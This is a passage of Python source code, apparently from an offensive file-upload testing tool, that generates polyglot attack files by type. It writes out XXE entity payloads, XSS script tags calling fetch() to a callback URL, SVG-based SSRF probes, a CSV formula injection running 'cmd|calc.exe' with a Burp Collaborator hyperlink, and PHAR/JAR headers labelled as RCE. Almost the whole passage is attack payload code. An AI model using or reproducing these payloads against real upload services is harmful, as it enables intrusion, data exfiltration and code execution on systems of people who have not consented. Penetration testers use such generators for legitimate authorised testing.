                    ('ssrf1_png_svg', lambda: create_png_polyglot_append(f'<svg xmlns="http://www.w3.org/2000/svg"><image href="{base_url}/ssrf-png-svg"/></svg>')),
                ],
            },
            'zip': {
                'xxe': [
                    ('xxe1_png_zip', lambda: create_png_polyglot_append('PK\x03\x04')),
                ],
            },
            'jar': {
                'rce': [
                    ('rce1_png_jar', lambda: create_png_polyglot_append('PK\x03\x04META-INF/MANIFEST.MF')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_png_pdf', lambda: create_png_polyglot_append('%PDF-1.4')),
                ],
            },
            'docx': {
                'xxe': [
                    ('xxe1_png_docx', lambda: create_png_polyglot_append('PK\x03\x04')),
                ],
            },
        },
        'jpg': {
            'svg': {
                'xxe': [
                    ('xxe1_jpg_svg', lambda: create_jpg_polyglot_append(f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>')),
                ],
                'ssrf': [
                    ('ssrf1_jpg_svg', lambda: create_jpg_polyglot_append(f'<svg xmlns="http://www.w3.org/2000/svg"><image href="{base_url}/ssrf-jpg-svg"/></svg>')),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_jpg_xml', lambda: create_jpg_polyglot_append(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{base_url}/xxe-jpg-xml">]><root>&xxe;</root>')),
                ],
            },
            'zip': {
                'xxe': [
                    ('xxe1_jpg_zip', lambda: create_jpg_polyglot_append('PK\x03\x04')),
                ],
            },
            'js': {
                'xss': [
                    ('xss1_jpg_js', lambda: create_jpg_polyglot_append(f'<script>fetch("{base_url}/xss-jpg-js")</script>')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_jpg_pdf', lambda: create_jpg_polyglot_append('%PDF-1.4')),
                ],
            },
            'phar': {
                'rce': [
                    ('rce1_jpg_phar', lambda: create_jpg_polyglot_append('<?php __HALT_COMPILER();')),
                ],
            },
        },
        'jpeg': {
            'svg': {
                'xxe': [
                    ('xxe1_jpeg_svg', lambda: create_jpg_polyglot_append(f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>')),
                ],
                'ssrf': [
                    ('ssrf1_jpeg_svg', lambda: create_jpg_polyglot_append(f'<svg xmlns="http://www.w3.org/2000/svg"><image href="{base_url}/ssrf-jpeg-svg"/></svg>')),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_jpeg_xml', lambda: create_jpg_polyglot_append(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{base_url}/xxe-jpeg-xml">]><root>&xxe;</root>')),
                ],
            },
            'zip': {
                'xxe': [
                    ('xxe1_jpeg_zip', lambda: create_jpg_polyglot_append('PK\x03\x04')),
                ],
            },
            'js': {
                'xss': [
                    ('xss1_jpeg_js', lambda: create_jpg_polyglot_append(f'<script>fetch("{base_url}/xss-jpeg-js")</script>')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_jpeg_pdf', lambda: create_jpg_polyglot_append('%PDF-1.4')),
                ],
            },
            'phar': {
                'rce': [
                    ('rce1_jpeg_phar', lambda: create_jpg_polyglot_append('<?php __HALT_COMPILER();')),
                ],
            },
        },
        'gif': {
            'jar': {
                'rce': [
                    ('rce1_gif_jar', lambda: create_jar_polyglot_gif(b'PK\x03\x04META-INF/MANIFEST.MF', burp_collab)),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_gif_svg', lambda: create_gif_with_metadata(f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>', burp_collab)),
                ],
            },
            'js': {
                'xss': [
                    ('xss1_gif_js', lambda: create_gif_with_metadata(f'<script>fetch("{base_url}/xss-gif-js")</script>', burp_collab)),
                ],
            },
            'zip': {
                'xxe': [
                    ('xxe1_gif_zip', lambda: create_gif_with_metadata('PK\x03\x04', burp_collab)),
                ],
            },
            'png': {
                'ssrf': [
                    ('ssrf1_gif_png', lambda: create_gif_with_metadata('PNG\x89PNG\r\n\x1a\n', burp_collab)),
                ],
            },
        },
        'webm': {
            'png': {
                'ssrf': [
                    ('ssrf1_webm_png', lambda: b'\x1a\x45\xdf\xa3' + b'PNG\x89PNG\r\n\x1a\n'),
                ],
            },
            'jpg': {
                'ssrf': [
                    ('ssrf1_webm_jpg', lambda: b'\x1a\x45\xdf\xa3' + b'\xFF\xD8\xFF\xE0'),
                ],
            },
            'zip': {
                'xxe': [
                    ('xxe1_webm_zip', lambda: b'\x1a\x45\xdf\xa3' + b'PK\x03\x04'),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_webm_svg', lambda: b'\x1a\x45\xdf\xa3' + f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'.encode('utf-8')),
                ],
            },
        },
        'mp4': {
            'png': {
                'ssrf': [
                    ('ssrf1_mp4_png', lambda: b'ftypmp41' + b'PNG\x89PNG\r\n\x1a\n'),
                ],
            },
            'jpg': {
                'ssrf': [
                    ('ssrf1_mp4_jpg', lambda: b'ftypmp41' + b'\xFF\xD8\xFF\xE0'),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_mp4_pdf', lambda: b'ftypmp41' + b'%PDF-1.4'),
                ],
            },
            'zip': {
                'xxe': [
                    ('xxe1_mp4_zip', lambda: b'ftypmp41' + b'PK\x03\x04'),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_mp4_svg', lambda: b'ftypmp41' + f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'.encode('utf-8')),
                ],
            },
        },
        'md': {
            'html': {
                'xss': [
                    ('xss1_md_html', f'''<script>fetch('{base_url}/xss-md-html')</script>
# Markdown content
'''),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_md_svg', f'''<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{base_url}/xxe-md-svg">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>
# Markdown
'''),
                ],
            },
            'png': {
                'xss': [
                    ('xss1_md_png', f'''![Image](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)
<script>fetch('{base_url}/xss-md-png')</script>
'''),
                ],
            },
        },
        'markdown': {
            'html': {
                'xss': [
                    ('xss1_markdown_html', f'''<script>fetch('{base_url}/xss-markdown-html')</script>
# Markdown content
'''),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_markdown_svg', f'''<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{base_url}/xxe-markdown-svg">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>
# Markdown
'''),
                ],
            },
            'png': {
                'xss': [
                    ('xss1_markdown_png', f'''![Image](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)
<script>fetch('{base_url}/xss-markdown-png')</script>
'''),
                ],
            },
        },
        'zip': {
            'png': {
                'xxe': [
                    ('xxe1_zip_png', lambda: create_zip_polyglot_append('PNG\x89PNG\r\n\x1a\n')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_zip_pdf', lambda: create_zip_polyglot_append('%PDF-1.4')),
                ],
            },
            'jar': {
                'rce': [
                    ('rce1_zip_jar', lambda: create_zip_polyglot_append('PK\x03\x04META-INF/MANIFEST.MF')),
                ],
            },
            'docx': {
                'xxe': [
                    ('xxe1_zip_docx', lambda: create_zip_polyglot_append('PK\x03\x04')),
                ],
            },
        },
        'jar': {
            'gif': {
                'rce': [
                    ('rce1_jar_gif', lambda: create_jar_polyglot_gif(b'GIF89a', burp_collab)),
                ],
            },
            'png': {
                'rce': [
                    ('rce1_jar_png', lambda: b'PK\x03\x04META-INF/MANIFEST.MF' + b'PNG\x89PNG\r\n\x1a\n'),
                ],
            },
            'pdf': {
                'rce': [
                    ('rce1_jar_pdf', lambda: b'PK\x03\x04META-INF/MANIFEST.MF' + b'%PDF-1.4'),
                ],
            },
            'docx': {
                'xxe': [
                    ('xxe1_jar_docx', lambda: b'PK\x03\x04META-INF/MANIFEST.MF' + create_docx_polyglot(None, burp_collab)),
                ],
            },
        },
        'epub': {
            'zip': {
                'xxe': [
                    ('xxe1_epub_zip', lambda: create_zip_polyglot_append('PK\x03\x04')),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_epub_svg', lambda: create_zip_polyglot_append(f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{base_url}/xxe-epub-svg">]><svg>&xxe;</svg>')),
                ],
            },
            'png': {
                'xxe': [
                    ('xxe1_epub_png', lambda: create_zip_polyglot_append('PNG\x89PNG\r\n\x1a\n')),
                ],
            },
            'docx': {
                'xxe': [
                    ('xxe1_epub_docx', lambda: create_zip_polyglot_append('PK\x03\x04')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_epub_pdf', lambda: create_zip_polyglot_append('%PDF-1.4')),
                ],
            },
        },
        'txt': {
            'zip': {
                'xxe': [
                    ('xxe1_txt_zip', lambda: create_zip_polyglot_append('PK\x03\x04')),
                ],
            },
            'xml': {
                'xxe': [
                    ('xxe1_txt_xml', f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-txt-xml">
]>
<root>&xxe;</root>'''),
                ],
            },
            'html': {
                'xss': [
                    ('xss1_txt_html', f'''<script>fetch('{base_url}/xss-txt-html')</script>'''),
                ],
            },
        },
        'csv': {
            'xlsx': {
                'xxe': [
                    ('xxe1_csv_xlsx', f'''=HYPERLINK("http://{burp_collab}/xxe-csv-xlsx","test")
=cmd|calc.exe|'''),
                ],
            },
            'zip': {
                'xxe': [
                    ('xxe1_csv_zip', lambda: create_zip_polyglot_append('PK\x03\x04')),
                ],
            },
            'js': {
                'xss': [
                    ('xss1_csv_js', f'''=HYPERLINK("javascript:fetch('{base_url}/xss-csv-js')","test")'''),
                ],
            },
        },
        'rtf': {
            'zip': {
                'xxe': [
                    ('xxe1_rtf_zip', lambda: b'{\\rtf1' + b'PK\x03\x04'),
                ],
            },
            'ole': {
                'rce': [
                    ('rce1_rtf_ole', lambda: b'{\\rtf1{\\object\\objdata 01050000' + b'%PDF-1.4'),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_rtf_svg', lambda: b'{\\rtf1' + f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'.encode('utf-8')),
                ],
            },
        },
        'odt': {
            'zip': {
                'xxe': [
                    ('xxe1_odt_zip', lambda: create_zip_polyglot_append('PK\x03\x04')),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_odt_svg', lambda: create_zip_polyglot_append(f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{base_url}/xxe-odt-svg">]><svg>&xxe;</svg>')),
                ],
            },
            'png': {
                'xxe': [
                    ('xxe1_odt_png', lambda: create_zip_polyglot_append('PNG\x89PNG\r\n\x1a\n')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_odt_pdf', lambda: create_zip_polyglot_append('%PDF-1.4')),
                ],
            },
        },
        'ods': {
            'zip': {
                'xxe': [
                    ('xxe1_ods_zip', lambda: create_zip_polyglot_append('PK\x03\x04')),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_ods_svg', lambda: create_zip_polyglot_append(f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{base_url}/xxe-ods-svg">]><svg>&xxe;</svg>')),
                ],
            },
            'png': {
                'xxe': [
                    ('xxe1_ods_png', lambda: create_zip_polyglot_append('PNG\x89PNG\r\n\x1a\n')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_ods_pdf', lambda: create_zip_polyglot_append('%PDF-1.4')),
                ],
            },
        },
        'odp': {
            'zip': {
                'xxe': [
                    ('xxe1_odp_zip', lambda: create_zip_polyglot_append('PK\x03\x04')),
                ],
            },
            'svg': {
                'xxe': [
                    ('xxe1_odp_svg', lambda: create_zip_polyglot_append(f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{base_url}/xxe-odp-svg">]><svg>&xxe;</svg>')),
                ],
            },
            'png': {
                'xxe': [
                    ('xxe1_odp_png', lambda: create_zip_polyglot_append('PNG\x89PNG\r\n\x1a\n')),
                ],
            },
            'pdf': {
                'ssrf': [
                    ('ssrf1_odp_pdf', lambda: create_zip_polyglot_append('%PDF-1.4')),
                ],
            },
        },
    }
    
    if target_ext not in extended_mappings:
        return
    
    mappings = extended_mappings[target_ext]
    
    for source_ext, vulns in mappings.items():
        source_dir = polyglot_dir / source_ext
        source_dir.mkdir(exist_ok=True)
        
        for vuln_type, payloads in vulns.items():
            vuln_dir = source_dir / vuln_type
            vuln_dir.mkdir(exist_ok=True)
            
            for payload_name, payload_content in payloads:
                filename = f"{payload_name}.{target_ext}"
                file_path = vuln_dir / filename
                
                try:
                    if callable(payload_content):
                        content = payload_content()
                    else:
                        content = payload_content
                    
                    if isinstance(content, bytes):
                        with open(file_path, 'wb') as f:
                            f.write(content)
                    else:
                        with open(file_path, 'w', encoding='utf-8') as f:
                            f.write(content)
                except Exception as e:
                    print(f"[!] Error generating {filename}: {e}")
                    continue
